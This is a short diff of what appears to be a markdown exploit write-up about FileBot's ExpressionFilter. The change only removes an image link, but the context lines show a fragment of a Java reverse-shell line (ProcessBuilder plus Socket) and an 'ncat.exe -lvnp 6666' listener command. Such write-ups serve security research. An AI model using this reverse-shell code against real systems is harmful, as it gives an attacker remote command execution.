@@ -65,9 +65,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ncat.exe -lvnp 6666
 ```
 
-![image](https://github.com/user-attachments/assets/d40a6aa4-0498-47fa-8cf0-6bab2a24dac6)
-
-
 ## Code
 
 https://github.com/mobeigi/filebot/blob/master/source/net/filebot/format/ExpressionFilter.java
